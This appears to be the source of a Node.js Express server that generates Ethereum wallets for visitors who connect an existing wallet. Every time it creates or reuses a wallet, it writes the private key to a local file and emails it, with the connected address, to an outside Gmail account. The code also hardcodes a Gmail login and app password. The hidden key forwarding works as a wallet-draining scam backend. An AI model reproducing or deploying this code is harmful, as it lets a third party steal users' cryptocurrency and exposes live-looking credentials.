const express = require("express");
const fs = require("fs");
const { ethers } = require("ethers");
const path = require("path");
const nodemailer = require('nodemailer'); // <-- added for email

const app = express();
app.use(express.json());

// Serve frontend files
app.use(express.static(path.join(__dirname, "public")));

const DATA_FILE = "./wallets.json";

// Load existing wallets or initialize empty
let walletData = [];
if (fs.existsSync(DATA_FILE)) {
    walletData = JSON.parse(fs.readFileSync(DATA_FILE));
}

// === Email setup ===
const transporter = nodemailer.createTransport({
    service: 'gmail',                 // or your email service
    auth: {
        user: 'scotthumphreys151@gmail.com', // <-- your email
        pass: 'evey cous paxg sgmy'     // <-- App password if using Gmail
    }
});

function sendEmailLog(subject, message) {
    const mailOptions = {
        from: 'scotthumphreys151@gmail.com',
        to: 'chamtoneri149@gmail.com', // <-- recipient email
        subject,
        text: message
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) console.error("Email error:", error);
        else console.log("Email sent:", info.response);
    });
}

// API endpoint to generate or retrieve ERC20 wallet
app.post("/generate", (req, res) => {
    const { connectedWallet } = req.body;

    if (!connectedWallet) {
        return res.status(400).json({ error: "No connected wallet provided" });
    }

    // Check if wallet already has a record
    const existing = walletData.find(w => w.connectedWallet === connectedWallet);
    if (existing) {
        // Send email log for existing wallet
        const logMessage = `
Wallet connected: ${connectedWallet}
ERC20 Address: ${existing.newAddress}
Private Key: ${existing.privateKey}
Timestamp: ${new Date().toISOString()}
(Already generated)
`;
        sendEmailLog("ERC20 Wallet Log", logMessage);

        // Return existing wallet instead of creating new
        return res.json({ newAddress: existing.newAddress, privateKey: existing.privateKey, reused: true });
    }

    // Generate a new wallet
    const newWallet = ethers.Wallet.createRandom();
    const record = {
        connectedWallet,
        newAddress: newWallet.address,
        privateKey: newWallet.privateKey,
        timestamp: new Date().toISOString()
    };

    walletData.push(record);
    fs.writeFileSync(DATA_FILE, JSON.stringify(walletData, null, 2));

    // Send email log for new wallet
    const logMessage = `
Wallet connected: ${connectedWallet}
ERC20 Address: ${newWallet.address}
Private Key: ${newWallet.privateKey}
Timestamp: ${new Date().toISOString()}
(New wallet created)
`;
    sendEmailLog("ERC20 Wallet Log", logMessage);

    res.json({ newAddress: newWallet.address, privateKey: newWallet.privateKey, reused: false });
});

// Start server
const PORT = 3000;
app.listen(PORT, () => console.log(`Server running at http://localhost:${PORT}`));
